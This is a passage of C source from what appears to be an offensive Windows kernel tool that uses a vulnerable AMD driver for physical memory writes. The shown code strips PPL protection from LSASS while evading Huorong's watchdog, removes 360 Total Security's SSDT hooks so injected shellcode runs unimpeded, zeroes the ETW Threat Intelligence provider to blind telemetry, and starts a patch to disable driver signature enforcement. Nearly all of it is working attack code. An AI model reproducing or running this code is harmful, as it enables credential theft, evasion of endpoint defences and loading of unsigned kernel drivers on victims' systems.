     *   build 22000-22621 (Win11 21H2): 0x87A
     *   build 22621+  (Win11 22H2)    : 0x884  ← confirmed in sysdiag binary
     *   build 26100+  (Win11 24H2)    : 0x884 or higher (probe confirms)
     * ppl_probe_offset_write_test() will refine via NtQIP ground-truth. */
    if      (ov.dwBuildNumber >= 22621) g_ep_off_prot = 0x884;
    else if (ov.dwBuildNumber >= 22000) g_ep_off_prot = 0x87A;
    else                                g_ep_off_prot = 0x878;
    printf("    build %lu → OFF_PROT=0x%X (initial guess, sysdiag-derived)\n",
           (unsigned long)ov.dwBuildNumber, g_ep_off_prot);
}

static uint32_t get_pid_by_name(const char *name)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32 pe = {sizeof pe};
    uint32_t found = 0;
    if (Process32First(snap, &pe)) do {
        if (_stricmp(pe.szExeFile, name) == 0) { found = pe.th32ProcessID; break; }
    } while (Process32Next(snap, &pe));
    CloseHandle(snap);
    return found;
}

/* NtQIP class 61 = ProcessProtectionInformation → PS_PROTECTION byte */
static uint8_t ppl_get_prot_api(uint32_t pid)
{
    typedef NTSTATUS (NTAPI *PFN)(HANDLE,ULONG,PVOID,ULONG,PULONG);
    PFN fn = (PFN)GetProcAddress(GetModuleHandleA("ntdll.dll"),
                                  "NtQueryInformationProcess");
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    uint8_t prot = 0;
    if (h && fn) fn(h, 61, &prot, 1, NULL);
    if (h) CloseHandle(h);
    return prot;
}

/* Same as ppl_get_prot_api but uses the globally saved g_lsass_pid.
 * Used in write-diagnostic loops where the pid is already known. */
static uint8_t ppl_ntqip_now(void)
{
    return ppl_get_prot_api(g_lsass_pid);
}

/* Walk the kernel's ActiveProcessLinks list (PsInitialSystemProcess → LSASS)
 * to find the live EPROCESS virtual address.  More reliable than physical scan
 * because it follows the same pointers the kernel uses. */
static uint64_t ppl_find_eproc_va(uint32_t lsass_pid,
                                    const uint8_t *pe, DWORD pe_sz, uint64_t nt_va)
{
    if (!g_kernel_cr3 || !pe || !pe_sz || !nt_va) return 0;

    /* PsInitialSystemProcess: ntoskrnl export whose value is a pointer to
     * the System EPROCESS.  Find it via disk-PE export table. */
    uint32_t rva = pe_export_rva(pe, pe_sz, "PsInitialSystemProcess");
    if (!rva) return 0;

    uint64_t var_va = nt_va + rva;
    uint64_t var_pa = va_to_pa(var_va);
    if (!var_pa) return 0;

    uint64_t sys_eproc_va = 0;
    if (!phys_read(var_pa, &sys_eproc_va, 8) || !sys_eproc_va) return 0;

    /* Traverse ActiveProcessLinks (doubly-linked list embedded in EPROCESS) */
    uint64_t list_head_va = sys_eproc_va + EP_OFF_FLINK;
    uint64_t curr_flink_va = 0;
    {
        uint64_t p = va_to_pa(list_head_va);
        if (!p || !phys_read(p, &curr_flink_va, 8)) return 0;
    }

    for (int limit = 4096; limit-- && curr_flink_va && curr_flink_va != list_head_va;) {
        uint64_t eproc_va = curr_flink_va - EP_OFF_FLINK;
        uint64_t pid_pa   = va_to_pa(eproc_va + EP_OFF_PID);
        if (pid_pa) {
            uint64_t pid = 0;
            phys_read(pid_pa, &pid, 8);
            if ((uint32_t)pid == lsass_pid) return eproc_va;
        }
        uint64_t next_pa = va_to_pa(curr_flink_va);
        if (!next_pa || !phys_read(next_pa, &curr_flink_va, 8)) break;
    }
    return 0;
}

/* Find the correct EPROCESS.Protection offset using NtQIP as ground truth.
 * For each candidate: write 0, evict ALL cores, query NtQIP.
 * If NtQIP returns 0 → this is the correct offset and write reached kernel.
 * Uses va_to_pa for field PA when EPROCESS VA is known (more precise). */
static uint32_t ppl_probe_offset_write_test(void)
{
    if (!g_lsass_prot_api) return 0;  /* not PPL, no need */

    /* Candidates ordered by likelihood (sysdiag watchdog rev: 0x884=W11 22H2,
     * 0x878=W10; 0x87C/0x880 guesses for W11 25H2 build 26200) */
    static const uint32_t cands[] = {
        0x884, 0x87C, 0x880, 0x878, 0x87A, 0x6B0, 0x4FA, 0x6FA, 0x7FA, 0x5FA, 0
    };

    for (int ci = 0; cands[ci]; ci++) {
        uint32_t off = cands[ci];

        /* Get field PA: prefer VA-based (live kernel mapping) */
        uint64_t field_pa = 0;
        if (g_lsass_eproc_va) {
            field_pa = va_to_pa(g_lsass_eproc_va + off);
        }
        if (!field_pa || !pa_in_range(field_pa, 1)) {
            if (g_lsass_ep.pa) field_pa = g_lsass_ep.pa + off;
        }
        if (!field_pa || !pa_in_range(field_pa, 1)) continue;

        uint8_t orig = 0;
        phys_read(field_pa, &orig, 1);

        uint8_t z = 0;
        phys_write(field_pa, &z, 1);
        cache_evict_all_cores();

        uint8_t post = ppl_ntqip_now();
        phys_write(field_pa, &orig, 1);  /* restore immediately */

        printf("    probe 0x%03X PA=0x%llX → NtQIP=0x%02X %s\n",
               off, (unsigned long long)field_pa, post,
               post==0 ? "✓ CONFIRMED" : "");

        if (post == 0) {
            g_ep_off_prot = off;
            g_lsass_ep.prot_orig = orig ? orig : g_lsass_prot_api;
            /* Update PA to the live field page (correct base) */
            if (g_lsass_eproc_va) {
                uint64_t base_pa = va_to_pa(g_lsass_eproc_va);
                if (base_pa) g_lsass_ep.pa = base_pa;
            }
            return off;
        }
    }
    return 0;
}

static void ppl_scan(uint32_t lsass_pid,
                     const uint8_t *pe, DWORD pe_sz, uint64_t nt_va)
{
    /* Step 1: find LSASS EPROCESS via kernel page-table walk (live, authoritative) */
    printf("    [kernel list walk] ");
    uint64_t eproc_va = ppl_find_eproc_va(lsass_pid, pe, pe_sz, nt_va);
    if (eproc_va) {
        g_lsass_eproc_va = eproc_va;
        uint64_t base_pa = va_to_pa(eproc_va);
        printf("EPROCESS VA=0x%llX  PA=0x%llX\n",
               (unsigned long long)eproc_va, (unsigned long long)base_pa);
        if (base_pa) {
            g_lsass_ep.pa = base_pa;
            g_lsass_ep.valid = 1;
        }
    } else {
        printf("not available (g_kernel_cr3=%s)\n", g_kernel_cr3 ? "ok" : "missing");
    }

    /* Step 2: physical scan as fallback (also sets g_lsass_ep.pa if step 1 failed) */
    if (!g_lsass_ep.valid) {
        static uint8_t ep[EP_READ_SZ];
        uint64_t last_prog = 0;

        for (int ri = 0; ri < g_nranges && !g_lsass_ep.valid; ri++) {
            uint64_t end = g_ranges[ri].base + g_ranges[ri].size;
            for (uint64_t cpa = g_ranges[ri].base; cpa < end && !g_lsass_ep.valid; cpa += CHUNK_SZ) {
                if (cpa - last_prog >= 0x40000000ULL) {
                    printf("  [%5lluMB] lsass=--\r", (unsigned long long)(cpa>>20));
                    fflush(stdout); last_prog = cpa;
                }
                uint64_t csz = end-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
                if (!phys_read(cpa, g_chunk, (uint32_t)csz)) continue;
                for (uint64_t off = EP_OFF_NAME; off+8 <= csz; off += 8) {
                    uint8_t c = g_chunk[off];
                    if (c<'A'||c>'z'||c=='['||c=='\\'||c==']'||c=='^'||c=='`') continue;
                    uint64_t epa = (cpa+off)-EP_OFF_NAME;
                    if (!pa_in_range(epa, EP_READ_SZ)) continue;
                    if (epa>=cpa && epa+EP_READ_SZ<=cpa+csz) memcpy(ep,g_chunk+(epa-cpa),EP_READ_SZ);
                    else if (!phys_read(epa,ep,EP_READ_SZ)) continue;
                    uint64_t pid=*(uint64_t*)(ep+EP_OFF_PID);
                    if (!pid||pid>0xFFFF) continue;
                    if (memcmp(ep+EP_OFF_NAME,g_chunk+off,4)) continue;
                    int ok=1; for(int k=0;k<15;k++){uint8_t nc=ep[EP_OFF_NAME+k];if(!nc)break;if(nc<0x20||nc>0x7E){ok=0;break;}}
                    if (!ok) continue;
                    uint64_t token=*(uint64_t*)(ep+EP_OFF_TOKEN),flink=*(uint64_t*)(ep+EP_OFF_FLINK),blink=*(uint64_t*)(ep+EP_OFF_BLINK);
                    if((token&~0xFULL)<0xFFFF800000000000ULL) continue;
                    if(flink<0xFFFF800000000000ULL||blink<0xFFFF800000000000ULL) continue;
                    if ((uint32_t)pid==lsass_pid) {
                        char nm[16]={0}; memcpy(nm,ep+EP_OFF_NAME,15);
                        printf("\n  [LSASS phys-scan] PA=0x%016llX  pid=%u  %s\n",
                               (unsigned long long)epa,(uint32_t)pid,nm);
                        g_lsass_ep.pa=epa; g_lsass_ep.valid=1;
                    }
                }
            }
        }
    }

    if (!g_lsass_ep.valid) return;

    /* Step 3: get live protection value + find correct offset via write test */
    g_lsass_prot_api = ppl_get_prot_api(lsass_pid);
    printf("    NtQIP(Protection)=0x%02X\n", g_lsass_prot_api);

    if (g_lsass_prot_api) {
        if(huorong_is_active()){
            /* sysdiag.sys watchdog BugChecks on any write to LSASS.Protection.
             * Skip write-probe; use static build-derived offset (less accurate but safe).
             * PPL bypass itself will also be skipped below for the same reason. */
            printf("    [Huorong detected] skipping write-probe to avoid watchdog BugCheck\n");
            printf("    Using static offset: 0x%X (build-derived, not probed)\n",g_ep_off_prot);
            g_lsass_ep.prot_orig = g_lsass_prot_api;
        } else {
            printf("    Probing Protection offset (write-test per candidate):\n");
            uint32_t confirmed = ppl_probe_offset_write_test();
            if (confirmed)
                printf("    Protection offset CONFIRMED: 0x%X  prot_orig=0x%02X\n",
                       g_ep_off_prot, g_lsass_ep.prot_orig);
            else
                printf("    [!] No offset confirmed — PPL bypass may fail\n");
        }
    } else {
        g_lsass_ep.prot_orig = 0;
    }
}

/* Write diagnostic: query NtQIP immediately after UC write.
 * If cache line cold → kernel fetches DRAM → returns 0 (LIVE).
 * If cache line hot  → kernel reads L3   → returns orig (STALE).
 * On STALE: retry with all-core eviction (up to 3 attempts). */
static int ppl_apply(void)
{
    if (!g_lsass_ep.valid) return 0;
    if (!g_lsass_prot_api) {
        g_ppl_applied = 1;
        return 1;
    }

    static const uint32_t CANDS[] = {
        0x884, 0x87A, 0x87C, 0x880, 0x878, 0x882, 0x888, 0x88C, 0x890, 0
    };
    uint8_t zero = 0;
    int confirmed_off = -1;

    /* ── Fast path: sysdiag IOCTL write (InterlockedExchange via MDL alias) ──
     * LOCK XCHG forces MESI M→I across all cores — new value is immediately
     * visible to any subsequent kernel WB read.  No cache eviction needed.
     * Works on VBS/HVCI where AMD-driver va_to_pa fails (page tables protected). */
    if(!g_lsass_eproc_va && g_lsass_pid)
        g_lsass_eproc_va = sd_find_lsass_eproc_va(g_lsass_pid);

    if(g_lsass_eproc_va && sd_open()){
        printf("    [SD-ppl] Fast path: sysdiag IOCTL write (no eviction needed)\n");
        for(int ci = 0; CANDS[ci] && confirmed_off < 0; ci++){
            uint32_t off = CANDS[ci];
            uint64_t prot_va = g_lsass_eproc_va + off;

            uint8_t pre = 0xFF;
            sd_read_kva(prot_va, &pre, 1);
            if(pre == 0x00) continue;
            if(pre != g_lsass_prot_api && pre != 0x41 && pre != 0x61 && pre != 0x21){
                printf("    [SD][0x%03X] pre=0x%02X — skip\n", off, pre);
                continue;
            }

            /* Use 4-byte atomic (InterlockedExchange32) for MESI cache-line
             * invalidation — size-1 writes have no LOCK prefix and are not
             * WB-coherent.  sd_write_byte_atomic4 reads the dword, patches
             * only the Protection byte, then writes back with LOCK XCHG32. */
            if(sd_write_byte_atomic4(prot_va, 0)){
                uint8_t ntq = ppl_ntqip_now();
                printf("    [SD][0x%03X] pre=0x%02X NtQIP=0x%02X%s\n",
                       off, pre, ntq, ntq==0 ? " ← CONFIRMED" : " ← watchdog raced us");
                if(ntq == 0){
                    g_ep_off_prot        = off;
                    g_lsass_ep.prot_orig = pre;
                    confirmed_off        = ci;
                    break;
                }
                sd_write_byte_atomic4(prot_va, pre); /* restore before trying next */
            } else {
                printf("    [SD][0x%03X] sd_write_byte_atomic4 FAILED\n", off);
            }
        }
        if(confirmed_off >= 0){ g_ppl_applied = 1; return 1; }
        printf("    [SD-ppl] IOCTL path inconclusive — falling back to phys+evict\n");
    }

    /* ── Slow path: AMD driver phys_write + all-core cache eviction ──
     * UC write → DRAM, then flush all WB lines so kernel re-fetches from DRAM.
     * Vulnerable to watchdog thread restoring during the ~80ms eviction window. */
    printf("    Probing offsets via phys_write + eviction (watchdog killed, bypasses active)...\n");
    printf("    Pre-probe eviction...\n");
    cache_evict_all_cores();

    for(int ci = 0; CANDS[ci] && confirmed_off < 0; ci++){
        uint32_t off = CANDS[ci];
        uint64_t pa = g_lsass_eproc_va ? va_to_pa(g_lsass_eproc_va + off) : 0;
        if(!pa) pa = g_lsass_ep.pa + off;

        uint8_t pre = 0xFF;
        phys_read(pa, &pre, 1);
        if(pre == 0x00){
            printf("    [0x%03X] pre=0x%02X — already 0 or wrong field, skip\n", off, pre);
            continue;
        }
        if(pre != g_lsass_prot_api && pre != 0x41 && pre != 0x61 && pre != 0x21){
            printf("    [0x%03X] pre=0x%02X — unexpected value, skip\n", off, pre);
            continue;
        }

        phys_write(pa, &zero, 1);
        cache_evict_all_cores();
        uint8_t rb = 0xFF; phys_read(pa, &rb, 1);
        uint8_t ntq = ppl_ntqip_now();
        printf("    [0x%03X] pre=0x%02X → rb=0x%02X  NtQIP=0x%02X%s\n",
               off, pre, rb, ntq,
               (ntq == 0) ? "  ← CONFIRMED" :
               (rb  == 0) ? "  ← phys_write OK, cache hot (watchdog?)" :
                            "  ← write not reaching RAM / watchdog alive");

        if(ntq == 0){
            g_ep_off_prot        = off;
            g_lsass_ep.prot_orig = pre;
            confirmed_off        = ci;
            break;
        }
        phys_write(pa, &pre, 1);
    }

    if(confirmed_off < 0){
        printf("    [!] All offsets STALE — force-apply at 0x%X\n", g_ep_off_prot);
        uint64_t pa = g_lsass_eproc_va ? va_to_pa(g_lsass_eproc_va + g_ep_off_prot) : 0;
        if(!pa) pa = g_lsass_ep.pa + g_ep_off_prot;
        phys_write(pa, &zero, 1);
        cache_evict_all_cores();
        uint8_t rb = 0xFF; phys_read(pa, &rb, 1);
        printf("    Force-apply phys_read=0x%02X  NtQIP=0x%02X\n", rb, ppl_ntqip_now());
        g_ppl_applied = 1;
        return 1;
    }

    g_ppl_applied = 1;
    return 1;
}

static void ppl_restore(void)
{
    if (!g_ppl_applied) return;
    if (g_lsass_ep.valid && g_lsass_prot_api)
        phys_write(g_lsass_ep.pa + g_ep_off_prot, &g_lsass_ep.prot_orig, 1);
    g_ppl_applied = 0;
}

/* ══════════════════════════════════════════════════════════════════════
 * §COMBINED POOL SCAN  (defined here so all module try-functions are visible)
 *
 * Single pass over physical memory running OB + FLT + CM + WFP scanners.
 * Optimisations vs four separate full passes:
 *   • 4× fewer phys_read IOCTL calls (one chunk read serves all scanners)
 *   • kernel-VA pre-filter: byte[7]==0xFF check rejects ~95% of offsets
 *   • zero-chunk early-skip (unallocated pages)
 * ══════════════════════════════════════════════════════════════════════ */
static void combined_pool_scan(void)
{
    g_ob_n=0; g_flt_n_raw=0; g_cm_n=0; g_wfp_n=0;
    init_pstype_va(); /* resolve PsProcessType/PsThreadType VAs for ob_try trampoline path */
    uint64_t lp=0;
    const uint8_t flt_ancs[3]={0x20,0x18,0x28};
    const uint8_t cm_ancs[2]={0x28,0x20};

    for(int ri=0;ri<g_nranges;ri++){
        uint64_t re=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t cpa=g_ranges[ri].base;cpa<re;cpa+=CHUNK_SZ){
            if(cpa-lp>=0x80000000ULL){
                printf("  [%5lluMB] ob=%-4d flt=%-5d cm=%-4d wfp=%-4d\r",
                       (unsigned long long)(cpa>>20),g_ob_n,g_flt_n_raw,g_cm_n,g_wfp_n);
                fflush(stdout); lp=cpa;
            }
            uint64_t csz=re-cpa; if(csz>CHUNK_SZ) csz=CHUNK_SZ;
            if(!phys_read(cpa,g_chunk,(uint32_t)csz)) continue;
            /* Zero-chunk skip: first 64 bytes all zero → unallocated, nothing to scan */
            {int nz=0;for(int zi=0;zi<64&&(uint64_t)zi<csz;zi+=8)if(*(uint64_t*)(g_chunk+zi)){nz=1;break;}if(!nz) continue;}

            int ob_full=(g_ob_n>=OB_MAX),     flt_full=(g_flt_n_raw>=FLT_MAX_RAW);
            int cm_full=(g_cm_n>=CM_MAX),      wfp_full=(g_wfp_n>=WFP_MAX);
            if(ob_full&&flt_full&&cm_full&&wfp_full) goto cps_done;

            for(uint64_t off=0x28;off+0x18<=csz;off+=8){
                /* Kernel-VA pre-filter: all try-functions require a kernel function
                 * pointer (bits 63:48 == 0xFFFF) at `off`.  One byte check eliminates
                 * ~95% of positions immediately without calling any try-function. */
                if(g_chunk[off+7]!=0xFF) continue;

                if(!ob_full){
                    if(!ob_try(cpa,off,csz)) ob_try_20(cpa,off,csz);
                    /* ObjectType-position scan: finds sysdiag trampolines missed by preop scan */
                    if(g_pstype_va[0]) { if(!ob_try_by_ot(cpa,off,csz,g_pstype_va[0])) ob_try_by_ot_raw(cpa,off,csz,g_pstype_va[0]); }
                    if(g_pstype_va[1]) { if(!ob_try_by_ot(cpa,off,csz,g_pstype_va[1])) ob_try_by_ot_raw(cpa,off,csz,g_pstype_va[1]); }
                    ob_full=(g_ob_n>=OB_MAX);
                }
                if(!flt_full&&off+0x10<=csz){
                    for(int ai=0;ai<3;ai++) if(flt_try(cpa,off,flt_ancs[ai],csz)) break;
                    flt_full=(g_flt_n_raw>=FLT_MAX_RAW);
                }
                if(!cm_full){
                    int hit=0;
                    for(int ai=0;ai<2&&!hit;ai++) hit=cm_try(cpa,off,csz,cm_ancs[ai]);
                    if(!hit) for(int ai=0;ai<2&&!hit;ai++) hit=cm_try_noalt(cpa,off,csz,cm_ancs[ai]);
                    cm_full=(g_cm_n>=CM_MAX);
                }
                if(!wfp_full&&off+0x20<=csz){
                    wfp_try(cpa,off,csz);
                    wfp_full=(g_wfp_n>=WFP_MAX);
                }
            }
        }
    }
cps_done:;
}

/* ══════════════════════════════════════════════════════════════════════
 * §7c  SSDT HOOK CLEAR  (360 Total Security x64 SSDT hooks)
 *
 * 360 Total Security (HipsDrv.sys) bypasses PatchGuard on x64 to install
 * hooks in KiServiceTable (SSDT), targeting:
 *   NtOpenProcess, NtReadVirtualMemory, NtWriteVirtualMemory,
 *   NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx,
 *   NtSetContextThread, NtMapViewOfSection, NtLoadDriver.
 *
 * Our AMD physical R/W primitive bypasses SSDT entirely — the driver's
 * IRP handler calls MmMapIoSpace() directly, never traverses KiServiceTable.
 * However, shellcode/payloads INJECTED into other processes DO call normal
 * syscall stubs which traverse KiServiceTable. Clearing hooks here ensures
 * injected code works correctly without hitting 360's interception.
 *
 * Method:
 *   1. Read KeServiceDescriptorTable export → {KiServiceTable VA, Limit}
 *   2. Read disk PE KiServiceTable entries via rva_to_foff() (handles
 *      FileAlignment != SectionAlignment).
 *   3. Compare disk vs live physical memory entries → hooks = differences.
 *   4. Write back disk (correct) values for each hooked entry.
 *
 * PatchGuard safety: after restoring CORRECT entries, PatchGuard's next
 * verification pass finds the table clean and does NOT BSOD.  The window
 * between 360's hook write and our restore contains the PG violation —
 * we eliminate it, not create one.
 *
 * Note: if 360 is not installed or its SSDT hooks are absent, ssdt_scan()
 * returns 0 and ssdt_apply() is a no-op.  Safe to call unconditionally.
 * ══════════════════════════════════════════════════════════════════════ */

#define SSDT_MAX_HOOKS 128

typedef struct {
    uint32_t idx;        /* KiServiceTable index = syscall number */
    uint32_t hooked_raw; /* 360-modified 32-bit entry in live memory */
    uint32_t orig_raw;   /* correct entry from disk PE */
    uint64_t hook_va;    /* decoded function VA of 360's hook */
} SsdtHookEntry;

static SsdtHookEntry g_ssdt[SSDT_MAX_HOOKS];
static int      g_ssdt_n   = 0;
static uint64_t g_kst_pa   = 0;  /* physical addr of KiServiceTable[0] */
static uint64_t g_kst_va   = 0;  /* virtual  addr of KiServiceTable[0] */
static uint32_t g_kst_limit = 0; /* number of syscall entries          */

/* Convert PE RVA → raw file offset, correctly handling FileAlignment != SectionAlignment.
 * Returns 0 if rva not in any section. */
static uint32_t rva_to_foff(const uint8_t *pe, uint32_t pe_sz, uint32_t rva)
{
    if (pe_sz < 0x100) return 0;
    uint32_t lfanew = *(uint32_t*)(pe + 0x3C);
    if (lfanew + 0x108u > pe_sz) return 0;
    const uint8_t *nt = pe + lfanew;
    if (*(uint32_t*)nt != 0x00004550) return 0;
    uint16_t nsec  = *(uint16_t*)(nt + 6);
    uint16_t optsz = *(uint16_t*)(nt + 20);
    const uint8_t *sec = nt + 24 + optsz;
    for (int i = 0; i < nsec && i < 64; i++, sec += 40) {
        uint32_t vaddr = *(uint32_t*)(sec + 12); /* VirtualAddress   */
        uint32_t vsz   = *(uint32_t*)(sec + 8);  /* VirtualSize      */
        uint32_t raw   = *(uint32_t*)(sec + 20); /* PointerToRawData */
        if (!raw) continue;
        if (rva >= vaddr && rva < vaddr + vsz)
            return raw + (rva - vaddr);
    }
    return 0;
}

/* Decode a KiServiceTable 32-bit entry to a function VA.
 * x64 Windows encoding: fn_va = kst_va + ((int32_t)entry >> 4)
 * The lower 4 bits store the argument byte count; arithmetic right-shift
 * by 4 yields a signed 28-bit offset from KiServiceTable base. */
static uint64_t ssdt_decode_va(uint32_t entry, uint64_t kst_va)
{
    return (uint64_t)((int64_t)kst_va + ((int64_t)(int32_t)entry >> 4));
}

static int ssdt_scan(void)
{
    g_ssdt_n = 0; g_kst_pa = 0; g_kst_va = 0; g_kst_limit = 0;
    if (!g_nt_pa || !g_nt_pe || !g_nt_pe_sz || !g_nt_va) return 0;

    /* ── Step 1: locate KiServiceTable via KeServiceDescriptorTable export ── */
    uint32_t ksdt_rva = pe_export_rva(g_nt_pe, g_nt_pe_sz, "KeServiceDescriptorTable");
    if (!ksdt_rva) {
        printf("  [SSDT] KeServiceDescriptorTable not exported\n"); return 0; }

    /* KSERVICE_TABLE_DESCRIPTOR layout:
     *   +0x00  PULONG_PTR  Base   = KiServiceTable VA
     *   +0x08  PULONG      Count  (NULL on retail)
     *   +0x10  ULONG       Limit  = number of syscalls
     *   +0x18  PUCHAR      Number (argument table)
     * Physical addr uses g_nt_pa+rva (ntoskrnl large-page → PA offset = RVA). */
    uint64_t ksdt_pa = g_nt_pa + ksdt_rva;
    uint8_t  ksdt_buf[0x20] = {0};
    if (!phys_read(ksdt_pa, ksdt_buf, sizeof(ksdt_buf))) {
        printf("  [SSDT] phys_read KeServiceDescriptorTable FAIL\n"); return 0; }

    uint64_t kst_va = *(uint64_t*)(ksdt_buf + 0x00);
    uint32_t limit  = *(uint32_t*)(ksdt_buf + 0x10);

    printf("  [SSDT] KiServiceTable VA=0x%016llX  limit=%u\n",
           (unsigned long long)kst_va, limit);

    if ((kst_va >> 48) != 0xFFFF || limit == 0 || limit > 512) {
        printf("  [SSDT] sanity check failed\n"); return 0; }
    if (kst_va < g_nt_va || kst_va >= g_nt_va + (uint64_t)g_nt_pe_sz + 0x200000ULL) {
        printf("  [SSDT] KiServiceTable VA outside plausible ntoskrnl range\n"); return 0; }

    uint64_t kst_rva = kst_va - g_nt_va;
    uint64_t kst_pa  = g_nt_pa + kst_rva;
    g_kst_pa = kst_pa; g_kst_va = kst_va; g_kst_limit = limit;

    /* ── Step 2: read live KiServiceTable from physical memory ── */
    uint32_t *live = (uint32_t*)malloc(limit * 4 + 16);
    if (!live) return 0;
    if (!phys_read(kst_pa, live, limit * 4)) { free(live); return 0; }

    /* ── Step 3: get disk baseline via proper RVA→file-offset mapping ── */
    uint32_t kst_foff = rva_to_foff(g_nt_pe, (uint32_t)g_nt_pe_sz, (uint32_t)kst_rva);
    const uint32_t *disk = NULL;
    if (kst_foff && kst_foff + limit * 4 <= (uint32_t)g_nt_pe_sz)
        disk = (const uint32_t*)(g_nt_pe + kst_foff);
    else
        printf("  [SSDT] disk baseline unavailable (foff=0x%X) — range-check only\n", kst_foff);

    /* ── Step 4: detect hooks ── */
    uint64_t nt_end = g_nt_va + g_nt_pe_sz + 0x100000ULL; /* +1MB slop for last section */
    for (uint32_t i = 0; i < limit && g_ssdt_n < SSDT_MAX_HOOKS; i++) {
        int hooked = 0;
        if (disk) {
            /* Primary: disk mismatch */
            if (live[i] != disk[i]) hooked = 1;
        } else {
            /* Fallback: fn_va outside ntoskrnl range */
            uint64_t fva = ssdt_decode_va(live[i], kst_va);
            if (fva < g_nt_va || fva >= nt_end) hooked = 1;
        }
        if (!hooked) continue;
        uint64_t fva = ssdt_decode_va(live[i], kst_va);
        g_ssdt[g_ssdt_n].idx        = i;
        g_ssdt[g_ssdt_n].hooked_raw = live[i];
        g_ssdt[g_ssdt_n].orig_raw   = disk ? disk[i] : 0;
        g_ssdt[g_ssdt_n].hook_va    = fva;
        uint64_t drv_rva2 = 0;
        const char *hdrv = va_to_driver_ex(fva, &drv_rva2);
        printf("  [SSDT] hook idx=%3u live=0x%08X disk=0x%08X → 0x%016llX (%s+0x%llX)\n",
               i, live[i], disk ? disk[i] : 0,
               (unsigned long long)fva,
               hdrv ? hdrv : "?", (unsigned long long)drv_rva2);
        g_ssdt_n++;
    }
    if (!g_ssdt_n) printf("  [SSDT] no hooks detected\n");

    free(live);
    return g_ssdt_n;
}

static int ssdt_apply(void)
{
    if (!g_ssdt_n) return 0;
    int ok = 0;
    cache_evict_all_cores();
    for (int i = 0; i < g_ssdt_n; i++) {
        if (!g_ssdt[i].orig_raw) {
            printf("    [SSDT] idx=%u — disk ref unavailable, skipped\n", g_ssdt[i].idx);
            continue;
        }
        uint64_t pa = g_kst_pa + (uint64_t)g_ssdt[i].idx * 4;
        if (phys_write(pa, &g_ssdt[i].orig_raw, 4)) {
            uint32_t rb = 0; phys_read(pa, &rb, 4);
            int match = (rb == g_ssdt[i].orig_raw);
            printf("    [SSDT] idx=%u restored 0x%08X → 0x%08X readback=%s\n",
                   g_ssdt[i].idx, g_ssdt[i].hooked_raw, g_ssdt[i].orig_raw,
                   match ? "OK" : "STALE");
            if (match) ok++;
        } else {
            printf("    [SSDT] idx=%u write FAIL (PA=0x%llX)\n",
                   g_ssdt[i].idx, (unsigned long long)pa);
        }
    }
    cache_evict_all_cores();
    return ok;
}

/* ══════════════════════════════════════════════════════════════════════
 * §7d  ETW-TI METHOD C — targeted scan: ntoskrnl static sections only
 *
 * On Win11 22H2+ some builds allocate _ETW_GUID_ENTRY for the Threat
 * Intelligence provider statically inside ntoskrnl .data / ALMOSTRO
 * rather than in pool.  Method B (full RAM scan) handles this but must
 * traverse all physical memory.  Method C restricts the search to the
 * ntoskrnl .data / ALMOSTRO / INITDATA sections (typically ≤ 2 MB) for
 * a fast first pass.  Same Flink/Blink + IsEnabled validation as Method B.
 * Re-uses g_etw_isen_pa / g_etw_isen_orig so etw_restore() covers it.
 * ══════════════════════════════════════════════════════════════════════ */
static int etw_method_c(void)
{
    if (!g_nt_pa || !g_nt_pe || !g_nt_pe_sz) return 0;
    static const uint32_t GOFF_C[] = {0x30,0x28,0x20,0x18,0x38,0};
    IMAGE_DOS_HEADER     *dosc  = (IMAGE_DOS_HEADER *)g_nt_pe;
    IMAGE_NT_HEADERS64   *nthc  = (IMAGE_NT_HEADERS64 *)(g_nt_pe + dosc->e_lfanew);
    IMAGE_SECTION_HEADER *secsc = (IMAGE_SECTION_HEADER *)
                                   ((uint8_t*)nthc + sizeof(IMAGE_NT_HEADERS64));
    uint16_t nsecc = nthc->FileHeader.NumberOfSections;
    for (int sic = 0; sic < nsecc; sic++) {
        const char *snc = (const char *)secsc[sic].Name;
        if (memcmp(snc,".data",   5) &&
            memcmp(snc,"ALMOSTR", 7) &&
            memcmp(snc,"INITDATA",8)) continue;
        uint32_t rvac = secsc[sic].VirtualAddress;
        uint32_t vszc = secsc[sic].Misc.VirtualSize;
        if (!rvac || !vszc) continue;
        uint64_t pa0c = g_nt_pa + rvac, pa1c = pa0c + vszc;
        for (uint64_t cpac = pa0c; cpac < pa1c; cpac += CHUNK_SZ) {
            uint64_t cszc = pa1c - cpac; if (cszc > CHUNK_SZ) cszc = CHUNK_SZ;
            if (!phys_read(cpac, g_chunk, (uint32_t)cszc)) continue;
            for (uint64_t offc = 0; offc + 16 <= cszc; offc++) {
                if (memcmp(g_chunk+offc, ETW_TI_GUID, 16)) continue;
                uint64_t gpac = cpac + offc;
                for (int oic = 0; GOFF_C[oic]; oic++) {
                    uint32_t goc = GOFF_C[oic]; if (gpac < (uint64_t)goc) continue;
                    uint64_t epac = gpac - goc, flc = 0, blc = 0;
                    if (!phys_read(epac,   &flc, 8)) continue;
                    if (!phys_read(epac+8, &blc, 8)) continue;
                    if ((flc>>48)!=0xFFFF||(blc>>48)!=0xFFFF||flc==blc) continue;
                    uint8_t regc[0xE0] = {0};
                    phys_read(epac, regc, sizeof regc);
                    uint32_t ssc = goc+0x18, sec2 = goc+0x90;
                    if (sec2 > (uint32_t)sizeof regc) sec2 = (uint32_t)sizeof regc;
                    for (uint32_t dc = ssc; dc+4 <= sec2; dc += 4) {
                        if (*(uint32_t*)(regc+dc) != 1) continue;
                        if (regc[dc+4] > 5) continue;
                        uint64_t tpac = epac + dc; uint32_t zc = 0;
                        if (!phys_write(tpac, &zc, 4)) continue;
                        uint32_t rbc = 0; phys_read(tpac, &rbc, 4);
                        if (rbc != 0) continue;
                        printf("    [C] %.8s GUID@PA=0x%016llX IsEnabled@+0x%X zeroed\n",
                               secsc[sic].Name, (unsigned long long)gpac, dc);
                        if (!g_etw_isen_pa) { g_etw_isen_pa=tpac; g_etw_isen_orig=1; }
                        return 1;
                    }
                }
            }
        }
    }
    return 0;
}

/* ══════════════════════════════════════════════════════════════════════
 * §7e  g_CiOptions PATCH — Disable Driver Signature Enforcement (DSE)
 *
 * CI.dll global g_CiOptions: 0x06=DSE on, 0x00=unsigned drivers OK.
 * Method: scan CI.dll executable sections for the pattern
